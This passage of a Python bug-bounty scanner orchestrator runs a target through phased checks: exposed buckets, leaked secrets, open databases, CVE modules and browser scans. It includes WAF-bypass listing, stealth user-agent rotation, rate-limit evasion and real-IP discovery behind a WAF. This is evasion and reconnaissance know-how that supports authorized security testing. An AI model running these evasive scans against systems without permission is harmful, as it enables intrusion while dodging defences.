                        remediation="Set bucket ACL to private. Block public access at account level.",
                        cvss=9.1,
                        tags=["CLOUD", "DATA_EXPOSURE"],
                        phase="INFRA",
                    ))
                elif bucket.get("status") == "exists-403":
                    all_findings.append(Finding(
                        cve="INFRA-BUCKET-EXISTS",
                        severity="LOW",
                        title=f"{bucket['service'].upper()} Bucket Exists (403): {bucket['url']}",
                        url=bucket["url"],
                        evidence="Bucket exists but access denied — verify no unintended data",
                        remediation="Confirm bucket is intentional and has correct ACL policy.",
                        cvss=2.0,
                        tags=["CLOUD"],
                        phase="INFRA",
                    ))
            for secret in infra_result.github_secrets:
                all_findings.append(Finding(
                    cve="INFRA-GITHUB-SECRET",
                    severity="CRITICAL",
                    title=f"Secret in GitHub: {secret.get('secret_type','')} in {secret.get('repo','')}",
                    url=secret.get("url", ""),
                    evidence=f"File: {secret.get('file','')} | Pattern: {secret.get('pattern','')}",
                    remediation="Rotate the credential immediately. Use GitHub secret scanning alerts.",
                    cvss=9.8,
                    tags=["SECRETS", "GITHUB"],
                    phase="INFRA",
                ))
            # Interesting unprotected services
            for host in infra_result.hosts:
                for svc in host.http_services:
                    for interesting in svc.get("interesting", []):
                        sev_map = {
                            "mongodb-noauth": ("CRITICAL", 9.8, "NOSQL"),
                            "elasticsearch-noauth": ("CRITICAL", 9.8, "DATA_EXPOSURE"),
                            "phpinfo": ("MEDIUM", 5.3, "INFO_DISCLOSURE"),
                            "error-disclosure": ("LOW", 3.1, "INFO_DISCLOSURE"),
                            "credentials-in-page": ("HIGH", 7.5, "SECRETS"),
                        }
                        sv, cs, tag = sev_map.get(interesting, ("MEDIUM", 4.0, "INFO"))
                        all_findings.append(Finding(
                            cve=f"INFRA-{interesting.upper().replace('-','_')}",
                            severity=sv,
                            title=f"Unprotected Service: {interesting} at {svc['url']}",
                            url=svc["url"],
                            evidence=f"Tech: {svc.get('tech',[])} | Port: {host.open_ports}",
                            remediation="Apply authentication. Restrict access to internal networks.",
                            cvss=cs,
                            tags=[tag, "INFRA"],
                            phase="INFRA",
                        ))
        except Exception as e:
            print(f"{Y}[!]{RST} Infra phase error: {e}")
            if args.verbose:
                import traceback; traceback.print_exc()
    elif args.infra and not _HAS_INFRA:
        print(f"{Y}[!]{RST} infra.py not found in same directory as hunt.py")

    # ── Phase 0b: Stealth / WAF detection ─────────────────────────────────────
    if _HAS_STEALTH and not args.cve_only:
        print(f"\n{B}{BOLD}[Phase 0b] WAF Detection & Stealth Prep{RST}")
        try:
            waf_result = await detect_waf(base, args.verbose)
            if waf_result.detected:
                print(f"{Y}[WAF]{RST} Detected: {BOLD}{waf_result.waf_name}{RST} (confidence {waf_result.confidence:.0%})")
                for ev in waf_result.evidence[:3]:
                    print(f"       {DIM}{ev}{RST}")
                if waf_result.bypass_techniques:
                    print(f"{G}[WAF]{RST} Bypass techniques: {', '.join(waf_result.bypass_techniques[:5])}")
            else:
                print(f"{G}[WAF]{RST} No WAF detected or unrecognized")

            if args.stealth or (waf_result and waf_result.detected):
                print(f"{G}[+]{RST} Stealth mode active — adaptive delays, UA rotation")
                # Probe rate limit
                rl = await detect_rate_limit(base, args.verbose)
                if rl.get("rate_limited"):
                    safe_delay = rl.get("safe_delay_ms", 500)
                    if safe_delay > args.delay:
                        print(f"{Y}[RL]{RST} Rate limit detected — auto-adjusting delay to {safe_delay}ms")
                        args.delay = safe_delay

            # Real IP discovery
            real_ips = await find_real_ip(urllib.parse.urlparse(base).hostname or base, args.verbose)
            if real_ips:
                print(f"{G}[+]{RST} Potential real IPs found:")
                for r_ip in real_ips[:5]:
                    print(f"       {DIM}via {r_ip.get('method','?')}: {r_ip.get('ip','?')}{RST}")

        except Exception as e:
            if args.verbose:
                print(f"{Y}[!]{RST} Phase 0 error: {e}")
    elif args.waf:
        print(f"{Y}[WAF]{RST} Forced WAF vendor: {args.waf}")

    # ── Phase 1: recon.py ────────────────────────────────────────────────────
    if not args.no_recon and not args.cve_only:
        recon_out = os.path.join(outdir, "recon.json")
        recon_cmd = [
            sys.executable, os.path.join(script_dir, "recon.py"),
            base,
            "-o", recon_out,
            "-c", str(args.concurrency),
            "--delay", str(args.delay),
        ]
        if args.proxy:
            recon_cmd += ["--proxy", args.proxy]
        if args.cookies:
            recon_cmd += ["--cookies", args.cookies]
        if args.tech:
            recon_cmd += ["--tech", args.tech]
        if args.verbose:
            recon_cmd.append("-v")
        recon_data_raw = run_subprocess(recon_cmd, "Phase 1: recon.py", recon_out, args.verbose)
        # recon.json may be a list of endpoints or a dict — normalise to dict
        if isinstance(recon_data_raw, list):
            recon_data = {"endpoints": recon_data_raw, "subdomains": []}
        else:
            recon_data = recon_data_raw
        if recon_data:
            ep_count = len(recon_data.get("endpoints", []))
            print(f"\n{G}[+]{RST} Recon complete: {ep_count} endpoints, {len(recon_data.get('subdomains',[]))} subdomains")

    # ── Phase 2: gov_level.py ────────────────────────────────────────────────
    if not args.no_gov and not args.cve_only:
        gov_out = os.path.join(outdir, "gov.json")
        gov_cmd = [
            sys.executable, os.path.join(script_dir, "gov_level.py"),
            base,
            "-o", gov_out,
            "-c", str(args.concurrency),
        ]
        if args.token:
            gov_cmd += ["-t", args.token]
        if args.proxy:
            gov_cmd += ["--proxy", args.proxy]
        if args.verbose:
            gov_cmd.append("-v")
        gov_data = run_subprocess(gov_cmd, "Phase 2: gov_level.py", gov_out, args.verbose)
        if gov_data:
            gov_count = len(gov_data.get("findings", []))
            print(f"\n{G}[+]{RST} Gov-level complete: {gov_count} findings")

    # ── Phase 3: CVE modules ─────────────────────────────────────────────────
    cve_findings = await run_cve_modules(
        base=base,
        token=args.token,
        proxy=args.proxy,
        cookies=args.cookies,
        concurrency=args.concurrency,
        delay=args.delay,
        verbose=args.verbose,
    )
    all_findings.extend(cve_findings)

    # ── Phase 3b: Extended CVE modules ──────────────────────────────────────
    if _HAS_CVE_EXTENDED and not args.no_extended:
        print(f"\n{B}{BOLD}[Phase 3b] Extended CVE Modules ({len(CVE_EXTENDED_MODULES)} checks){RST}")
        ext_findings = await run_extended_cve_modules(
            base=base,
            token=args.token,
            proxy=args.proxy,
            cookies=args.cookies,
            concurrency=args.concurrency,
            delay=args.delay,
            verbose=args.verbose,
        )
        all_findings.extend(ext_findings)
        print(f"{G}[+]{RST} Extended CVE: {len(ext_findings)} findings")
    elif not _HAS_CVE_EXTENDED:
        print(f"{DIM}[i] cve_extended.py not found — skipping extended CVE modules{RST}")

    # ── Phase 4: External tools ──────────────────────────────────────────────
    if (args.tools or args.tools_only) and _HAS_TOOLS:
        print(f"\n{B}{BOLD}[Phase 4] External Tools{RST}")
        only_list = [t.strip() for t in args.tools_only.split(",")] if args.tools_only else None
        try:
            tool_results = run_all_tools(
                target=base,
                outdir=outdir,
                proxy=args.proxy,
                cookies=args.cookies or "",
                token=args.token or "",
                passive_only=False,
                aggressive=not args.stealth,
                only=only_list,
                verbose=args.verbose,
            )
            tools_json_path = os.path.join(outdir, "tools.json")
            with open(tools_json_path, "w", encoding="utf-8") as f:
                json.dump(
                    [{"tool": r.tool, "success": r.success, "findings": r.findings_count,
                      "output": r.output_file, "elapsed": r.elapsed, "error": r.error}
                     for r in tool_results],
                    f, indent=2,
                )
            successful = sum(1 for r in tool_results if r.success)
            total_ext = sum(r.findings_count for r in tool_results)
            print(f"{G}[+]{RST} Tools: {successful}/{len(tool_results)} ran, {total_ext} aggregate findings → {tools_json_path}")
        except Exception as e:
            print(f"{Y}[!]{RST} External tools error: {e}")
    elif args.tools and not _HAS_TOOLS:
        print(f"{Y}[!]{RST} tools.py not found — install it in same directory as hunt.py")

    # ── Phase 4b: Ghost browser scan ─────────────────────────────────────────
    ghost_findings_raw: list = []
    if args.ghost and _HAS_GHOST:
        print(f"\n{M}{BOLD}[Phase 4b] Ghost Browser Scan (Real Chromium + CDP Stealth){RST}")
        try:
            ghost_result = await ghost_scan(
                url=base,
                outdir=outdir,
                login_url=getattr(args, "ghost_login", None),
                username=getattr(args, "ghost_user", None),
                password=getattr(args, "ghost_pass", None),
                proxy=args.proxy,
                verbose=args.verbose,
            )
            ghost_findings_raw = ghost_result.get("findings", [])
            for gf in ghost_findings_raw:
                all_findings.append(Finding(
                    cve=gf.get("type", "GHOST"),
                    severity=gf.get("severity", "INFO"),
                    title=gf.get("title", ""),
                    url=gf.get("url", base),
                    evidence=str(gf.get("evidence", ""))[:500],
                    remediation=gf.get("remediation", ""),
                    cvss=float(gf.get("cvss", 0.0)),
                    tags=gf.get("tags", ["browser", "client-side"]),
                    phase="GHOST",
                ))
            screenshot = os.path.join(outdir, "ghost_screenshot.png")
            print(f"{G}[+]{RST} Ghost: {len(ghost_findings_raw)} findings", end="")
            if os.path.exists(screenshot):
                print(f" | screenshot → {screenshot}", end="")
            print()
        except Exception as e:
            print(f"{Y}[!]{RST} Ghost scan error: {e}")
            if args.verbose:
                import traceback; traceback.print_exc()
    elif args.ghost and not _HAS_GHOST:
        print(f"{Y}[!]{RST} ghost.py not found — install playwright: pip install playwright && playwright install chromium")

    # ── Phase 4c: Intel / Deep Analysis ──────────────────────────────────────
    intel_result = None
    if args.intel and _HAS_INTEL:
        print(f"\n{C}{BOLD}[Phase 4c] Intel — Attack Chains, Wayback, Source Maps, Entropy Secrets{RST}")
        try:
            intel_result = await run_intel(
                target=base,
                outdir=outdir,
                findings=all_findings,
                proxy=args.proxy,
                verbose=args.verbose,
            )
            intel_findings = intel_result.get("findings", [])
            for inf in intel_findings:
                all_findings.append(Finding(
                    cve=inf.get("type", "INTEL"),
                    severity=inf.get("severity", "INFO"),
                    title=inf.get("title", ""),
                    url=inf.get("url", base),
                    evidence=str(inf.get("evidence", ""))[:500],
                    remediation=inf.get("remediation", "Review and rotate immediately"),
                    cvss=float(inf.get("cvss", 0.0)),
                    tags=inf.get("tags", ["intel", "recon"]),
                    phase="INTEL",
                ))
            chains_matched = intel_result.get("attack_chains_matched", [])
            print(f"{G}[+]{RST} Intel: {len(intel_findings)} findings", end="")
            if chains_matched:
                print(f" | {len(chains_matched)} attack chain(s): {', '.join(c.get('name','?') for c in chains_matched[:3])}", end="")
            print()
            intel_md = os.path.join(outdir, "intel_report.md")
            if os.path.exists(intel_md):
                print(f"{G}[+]{RST} Intel report → {intel_md}")
        except Exception as e:
            print(f"{Y}[!]{RST} Intel error: {e}")
            if args.verbose:
                import traceback; traceback.print_exc()
    elif args.intel and not _HAS_INTEL:
        print(f"{Y}[!]{RST} intel.py not found — place it in same directory as hunt.py")

    # Merge gov findings into all_findings for unified report
    if gov_data:
        for gf in gov_data.get("findings", []):
            all_findings.append(Finding(
                cve=gf.get("check", "GOV"),
                severity=gf.get("severity", "INFO"),
                title=gf.get("title", ""),
                url=gf.get("url", ""),
                evidence=gf.get("evidence", "")[:400],
                remediation=gf.get("remediation", ""),
                cvss=gf.get("cvss", 0.0),
                tags=gf.get("tags", []),
                phase="GOV",
            ))

    # ── Phase 5: Report ──────────────────────────────────────────────────────
    print(f"\n{B}{BOLD}[Phase 5] Generating Report{RST}")
    md_path = generate_report(all_findings, recon_data, gov_data, base, outdir)

    # Summary
    counts = {s: sum(1 for f in all_findings if f.severity == s) for s in SEVERITY_ORDER}
    print(f"\n{BOLD}{'═'*60}{RST}")
    print(f"{BOLD}  HUNT COMPLETE — {base}{RST}")
    print(f"{'═'*60}")
    for s, c in counts.items():
        if c > 0:
            print(f"  {SEV_COLOR[s]}{s:10}{RST}  {BOLD}{c}{RST}")
    print(f"\n  {G}Report:{RST}  {md_path}")
    print(f"  {G}JSON:   {RST} {os.path.join(outdir, 'findings.json')}")
    if os.path.exists(os.path.join(outdir, "tools.json")):
        print(f"  {G}Tools:  {RST} {os.path.join(outdir, 'tools.json')}")
    if os.path.exists(os.path.join(outdir, "recon.json")):
        print(f"  {G}Recon:  {RST} {os.path.join(outdir, 'recon.json')}")
    if os.path.exists(os.path.join(outdir, "gov.json")):
        print(f"  {G}Gov:    {RST} {os.path.join(outdir, 'gov.json')}")
    if infra_result and os.path.exists(os.path.join(outdir, f"infra_{urllib.parse.urlparse(base).hostname}.json")):
        print(f"  {G}Infra:  {RST} {os.path.join(outdir, 'infra_' + (urllib.parse.urlparse(base).hostname or 'target') + '.json')}")
    if os.path.exists(os.path.join(outdir, "ghost_findings.json")):
        print(f"  {G}Ghost:  {RST} {os.path.join(outdir, 'ghost_findings.json')}")
    if os.path.exists(os.path.join(outdir, "intel_report.md")):
        print(f"  {G}Intel:  {RST} {os.path.join(outdir, 'intel_report.md')}")
    print(f"{'═'*60}\n")

    if any(f.severity in ("CRITICAL", "HIGH") for f in all_findings):
        print(f"{R}{BOLD}[!] CRITICAL/HIGH findings detected — review and report to program immediately.{RST}")
        print(f"{Y}[!] Do NOT exploit beyond proof-of-concept. Follow responsible disclosure.{RST}\n")


if __name__ == "__main__":
    import sys
    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(main())
